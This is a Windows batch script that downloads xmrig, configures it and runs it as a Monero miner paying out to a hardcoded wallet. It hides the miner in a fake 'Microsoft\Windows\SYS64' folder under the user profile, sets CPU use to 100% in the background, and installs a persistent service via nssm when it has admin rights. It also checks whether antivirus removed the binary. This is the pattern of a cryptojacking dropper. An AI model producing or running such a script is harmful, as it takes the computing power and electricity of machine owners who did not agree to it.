@echo off

set VERSION=2.2

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

set WALLET=43uEwaydbnz6hvuLxPYe4sVJBny5fDq3kUp25BWTHySES6SUZXv3M2uDqemLRrnQ6UHoSn5u2XEgqgFbVqaX2npyLZk7DyL
set EMAIL=null

rem checking prerequisites

if [%WALLET%] == [] (
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where wmic >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "wmic" utility to work correctly
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

rem calculating port

for /f "tokens=*" %%a in ('wmic cpu get SocketDesignation /Format:List ^| findstr /r /v "^$" ^| find /c /v ""') do set CPU_SOCKETS=%%a
if [%CPU_SOCKETS%] == [] ( 
  echo ERROR: Can't get CPU sockets from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfCores /Format:List ^| findstr /r /v "^$"') do set CPU_CORES_PER_SOCKET=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_CORES_PER_SOCKET%") do set CPU_CORES_PER_SOCKET=%%b
if [%CPU_CORES_PER_SOCKET%] == [] ( 
  echo ERROR: Can't get CPU cores per socket from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfLogicalProcessors /Format:List ^| findstr /r /v "^$"') do set CPU_THREADS=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_THREADS%") do set CPU_THREADS=%%b
if [%CPU_THREADS%] == [] ( 
  echo ERROR: Can't get CPU cores from wmic output
  exit 
)
set /a "CPU_THREADS = %CPU_SOCKETS% * %CPU_THREADS%"

for /f "tokens=*" %%a in ('wmic cpu get MaxClockSpeed /Format:List ^| findstr /r /v "^$"') do set CPU_MHZ=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_MHZ%") do set CPU_MHZ=%%b
if [%CPU_MHZ%] == [] ( 
  echo ERROR: Can't get CPU MHz from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get L2CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L2_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L2_CACHE%") do set CPU_L2_CACHE=%%b
if [%CPU_L2_CACHE%] == [] ( 
  echo ERROR: Can't get L2 CPU cache from wmic output
  exit 
)

for /f "tokens=*" %%a in ('wmic cpu get L3CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L3_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L3_CACHE%") do set CPU_L3_CACHE=%%b
if [%CPU_L3_CACHE%] == [] ( 
  echo ERROR: Can't get L3 CPU cache from wmic output
  exit 
)

set /a "TOTAL_CACHE = %CPU_SOCKETS% * (%CPU_L2_CACHE% / %CPU_CORES_PER_SOCKET% + %CPU_L3_CACHE%)"
if [%TOTAL_CACHE%] == [] ( 
  echo ERROR: Can't compute total cache
  exit 
)

set /a "CACHE_THREADS = %TOTAL_CACHE% / 2048"

if %CPU_THREADS% lss %CACHE_THREADS% (
  set /a "EXP_MONERO_HASHRATE = %CPU_THREADS% * (%CPU_MHZ% * 20 / 1000)"
) else (
  set /a "EXP_MONERO_HASHRATE = %CACHE_THREADS% * (%CPU_MHZ% * 20 / 1000)"
)

if [%EXP_MONERO_HASHRATE%] == [] ( 
  echo ERROR: Can't compute projected Monero hashrate
  exit 
)

if %EXP_MONERO_HASHRATE% gtr 12800 (
  echo ERROR: Wrong ^(too high^) projected Monero hashrate: %EXP_MONERO_HASHRATE%
  exit /b 1
)
if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=10002 & goto PORT_OK )
set PORT=10001

:PORT_OK

rem printing intentions

set "LOGFILE=%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\miner.bat script.
echo Mining will happen to %WALLET% wallet.

echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using moneroocean_miner service.
)

echo.
echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
echo.
timeout 5

rem start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" directory
timeout 5
rmdir /q /s "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" >NUL 2>NUL
IF EXIST "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" GOTO REMOVE_DIR0

echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download MoneroOcean advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

echo [*] Checking if advanced version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" (
  echo WARNING: Advanced version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" is not functional
) else (
  echo WARNING: Advanced version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" was removed by antivirus
)

echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
  exit /b 1
)

:REMOVE_DIR1
echo [*] Removing "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" directory
timeout 5
rmdir /q /s "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" >NUL 2>NUL
IF EXIST "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" GOTO REMOVE_DIR1

echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

echo [*] Checking if stock version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" (
  echo WARNING: Stock version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" is not functional
) else (
  echo WARNING: Stock version of "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

echo [*] Miner "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 

powershell -Command "$out = cat '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\config.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

echo ERROR: Can't find Windows startup directory
exit /b 1



:ADMIN_MINER_SETUP

echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  echo ERROR: Can't download tools to make moneroocean_miner service
  exit /b 1
)

echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

echo [*] Creating moneroocean_miner service
sc stop moneroocean_miner
sc delete moneroocean_miner
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" install moneroocean_miner "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create moneroocean_miner service
  exit /b 1
)
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64"
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\stdout"
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\stderr"

echo [*] Starting moneroocean_miner service
"%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\nssm.exe" start moneroocean_miner
if errorlevel 1 (
  echo ERROR: Can't start moneroocean_miner service
  exit /b 1
)

goto OK

:OK
echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b





